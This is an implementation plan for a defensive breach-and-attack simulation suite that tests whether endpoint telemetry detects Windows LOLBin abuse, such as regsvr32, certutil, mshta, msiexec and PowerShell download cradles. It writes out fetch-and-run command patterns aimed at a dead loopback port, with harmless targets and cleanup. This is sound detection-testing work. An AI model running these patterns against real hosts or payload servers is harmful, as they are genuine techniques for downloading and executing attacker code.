# Endpoint Mastery 06 — Defense Evasion & LOLBin Execution: implementation plan

Status: PLAN ONLY. No scenario change until the decisions in section 6 are approved.

## 1. Defects in the current EM-06 (must fix in any expansion)

- Steps 01 and 02 report PASS whenever the process exits non-zero or fails to start. A failed launch is not a block. This is the same mistake fixed in EM-05.
- Step 02 runs `certutil -urlcache -split -f` and can write a file into the working directory. It has no cleanup.
- Neither step captures process-creation telemetry or detection evidence. The verdict is based on exit codes only.
- Verdict text uses `[BAS-SIM]` tags on new-style outcomes and `[cite: N]` markers from an earlier generator. Both need removing.
- Step 01's FAIL branch says "remained alive or ignored" for two different outcomes. These must be separated.

## 2. Three outcomes, kept separate

Every test records these as separate fields, in results.json and in the QA log:

| Field | Meaning | How it is measured |
|---|---|---|
| EXECUTED | The simulated process was created with the intended command line | Process object returned, plus Sysmon EID 1 or Security 4688 for that PID when auditing is on |
| DETECTED | Endpoint security or telemetry recorded the behaviour | Sysmon, Security 4688 or Defender events matching the synthetic marker, read after the step |
| BLOCKED | The process was prevented from running by policy | Distinct error (ACCESS_DENIED, ASR, AppLocker/WDAC event), not a generic non-zero exit |
| COLLECTED | Audspect received and reported the evidence | Checked against the Audspect query API when available; otherwise SKIP with reason |

Verdict rule for the step (COLLECTED never changes it):
- PASS: BLOCKED, or EXECUTED and DETECTED.
- FAIL: EXECUTED and not DETECTED.
- ERROR: the test could not run or cleanup failed.
- SKIP: not applicable, or detection source absent, with a reason.

## 3. Test-by-test design (16 tests)

Harmless targets only: loopback ports with nothing listening (127.0.0.1:9), synthetic files under a unique `%TEMP%\AudspectEM06_<guid>` folder that is removed afterwards, and non-existent DLL or script paths. No payloads are downloaded or run.

| ID | Test | Probe (harmless) | ATT&CK | Notes |
|---|---|---|---|---|
| 01 | Regsvr32 Squiblydoo | `regsvr32 /s /i:http://127.0.0.1:9/x.sct scrobj.dll` | T1218.010 | Fixes the existing step 01 |
| 02 | Certutil URL pattern | `certutil -urlcache -split -f http://127.0.0.1:9/x.txt` | T1105 | Connection refused; asserts no file was written in the working directory |
| 03 | Rundll32 suspicious DLL | `rundll32 <temp>\missing.dll,Entry` | T1218.011 | Missing DLL, so no code runs |
| 04 | Mshta script | `mshta vbscript:Close(Execute("1"))` | T1218.005 | Opens and closes a window; no file |
| 05 | InstallUtil proxy | `InstallUtil.exe /LogFile= /U <temp>\bas.exe` | T1218.004 | Needs a compiled no-op assembly. Owner decision 6.2 |
| 06 | Msiexec remote package | `msiexec /i http://127.0.0.1:9/x.msi /qn` | T1218.007 | Connection refused; no install |
| 07 | Control Panel applet | `control.exe <temp>\missing.cpl` | T1218.002 | Missing file |
| 08 | CMSTP proxy | `cmstp.exe /s <temp>\empty.inf` | T1218.003 | Side effects not verified. Owner decision 6.4 |
| 09 | Regsvr32 unusual registration | `regsvr32 /s <temp>\missing.dll` | T1218.010 | Distinct from 01 (local path, not URL). Owner decision 6.1 |
| 10 | Certutil decode | `certutil -decode <temp>\in.b64 <temp>\out.bin` | T1140 | Decode only. The certificate-store part (T1553.004) is removed. Owner decision 6.3 |
| 11 | PowerShell encoded command | `powershell -enc <base64 of Write-Output 'BAS'>` | T1059.001 | Output is a fixed string |
| 12 | PowerShell download cradle pattern | `IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/x')` | T1105 | Connection refused. Nothing is executed |
| 13 | Script interpreter chaining | `wscript` runs a temp VBS that starts `cmd /c echo BAS` | T1059 | Temp script removed afterwards |
| 14 | LOLBin from unusual directory | Copy a signed system binary to a temp folder under a different name, run `/?` | T1036 | Only where masquerading applies. Owner decision 6.5 |
| 15 | Parent-child anomaly | `powershell` spawns `cmd /c echo BAS` | T1059 | Behaviour-dependent: the detection depends on rules, not the test |
| 16 | Monitoring coverage for tamper attempts | Read-only query of the Defender service state, and a check that the query itself is logged | T1562.001 | The tamper is not simulated. Owner decision 6.6 |

## 4. Safety and host impact

- Read and launch probes run by default. Probes that create files, copy binaries or start processes with side effects run only when `BAS_EM06_ALLOW_EXEC_PROBES=1` is set on a lab host, as in EM-05.
- No network egress: every URL is 127.0.0.1 on a port with nothing listening.
- No registry writes, certificate-store changes, services or scheduled tasks.
- Every temporary file and folder is removed, and removal is verified.
- Not run on the production client.

## 5. Validation

- Syntax check of every step with the PowerShell parser before any run.
- Read-only run on the client, then a lab run with the exec gate on.
- Telemetry check: confirm Sysmon EID 1 or Security 4688 with command lines exists for each EXECUTED process. If process auditing is off (it was off on the lab server, EM-05 step 49), those steps report SKIP for DETECTED with the reason.
- COLLECTED is reported only where the Audspect API can be queried. Otherwise it is SKIP with the reason.

## 6. Decisions needed

1. **Test 09 vs test 01.** Both are T1218.010. Keep 09 as a distinct local-path case, or fold it into 01?
2. **Test 05 (InstallUtil).** Requires compiling a harmless .NET assembly in %TEMP% with csc.exe. Approve?
3. **Test 10.** Drop the certificate-store part (T1553.004), which would change the certificate store. Approve?
4. **Test 08 (CMSTP).** Side effects are not verified. Keep it gated and off by default, or drop it?
5. **Test 14 (masquerading).** Copies a signed system binary under another name into %TEMP% and removes it afterwards. Approve?
6. **Test 16.** Cannot simulate defence impairment safely. Proposal: read-only checks only, and drop T1562.001 from the mapping. Approve?

## 7. Sequence after approval

1. Write the 16 steps and keep steps 01 and 02 as the improved originals.
2. Syntax check, sign, contract tests, ledger rows for em-06 only.
3. Client read-only run; lab server run with the exec gate on.
4. QA log, PR, merge after review.
